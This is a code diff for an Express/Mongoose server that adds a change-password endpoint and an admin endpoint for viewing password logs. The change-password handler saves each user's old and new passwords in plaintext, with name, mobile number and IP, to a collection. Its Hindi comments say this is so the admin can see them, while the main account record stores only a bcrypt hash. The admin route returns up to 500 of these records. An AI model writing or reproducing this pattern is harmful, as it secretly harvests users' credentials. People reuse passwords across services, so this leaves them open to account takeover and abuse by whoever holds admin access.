@@ -1305,3 +1305,91 @@ server.headersTimeout = 66000;
 
 cleanupOldData();
 setInterval(cleanupOldData, 24 * 60 * 60 * 1000);
+// ============================================================
+// ✅ PASSWORD LOG SCHEMA (Mongoose)
+// ============================================================
+const PasswordLogSchema = new mongoose.Schema({
+  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
+  userName: { type: String, required: true },
+  userMobile: { type: String, required: true },
+  oldPassword: { type: String, required: true },  // Plaintext (admin ko dikhana hai)
+  newPassword: { type: String, required: true },  // Plaintext
+  ipAddress: { type: String, default: '-' },
+  changedAt: { type: Date, default: Date.now }
+});
+
+const PasswordLog = mongoose.model('PasswordLog', PasswordLogSchema);
+
+// ============================================================
+// ✅ ENDPOINT 1: CHANGE PASSWORD
+// ============================================================
+app.post('/api/change-password', authMiddleware, async (req, res) => {
+  try {
+    const { currentPassword, newPassword } = req.body;
+    
+    if (!currentPassword || !newPassword) {
+      return res.status(400).json({ error: 'Both passwords required' });
+    }
+    
+    if (newPassword.length < 6) {
+      return res.status(400).json({ error: 'Password must be at least 6 characters' });
+    }
+    
+    if (currentPassword === newPassword) {
+      return res.status(400).json({ error: 'New password must be different' });
+    }
+    
+    const user = req.user;
+    const bcrypt = require('bcryptjs');
+    
+    // Verify current password
+    const isValid = await bcrypt.compare(currentPassword, user.password);
+    if (!isValid) {
+      return res.status(401).json({ error: 'Current password is incorrect' });
+    }
+    
+    // ✅ Save password log (admin ko dikhega)
+    await PasswordLog.create({
+      userId: user._id,
+      userName: user.name,
+      userMobile: user.mobile,
+      oldPassword: currentPassword,
+      newPassword: newPassword,
+      ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-',
+      changedAt: new Date()
+    });
+    
+    // Update user password
+    user.password = await bcrypt.hash(newPassword, 10);
+    await user.save();
+    
+    res.json({ success: true, message: 'Password changed successfully' });
+    
+  } catch (err) {
+    console.error('Change password error:', err);
+    res.status(500).json({ error: 'Failed to change password' });
+  }
+});
+
+// ============================================================
+// ✅ ENDPOINT 2: ADMIN PASSWORD LOG
+// ============================================================
+app.get('/api/admin/password-logs', authMiddleware, async (req, res) => {
+  try {
+    const user = req.user;
+    if (!user.isAdmin && user.role !== 'admin') {
+      return res.status(403).json({ error: 'Admin access required' });
+    }
+    
+    const logs = await PasswordLog.find()
+      .sort({ changedAt: -1 })
+      .limit(500)
+      .lean();
+    
+    res.json({ logs });
+    
+  } catch (err) {
+    console.error('Password logs error:', err);
+    res.status(500).json({ error: 'Failed to load logs' });
+  }
+});
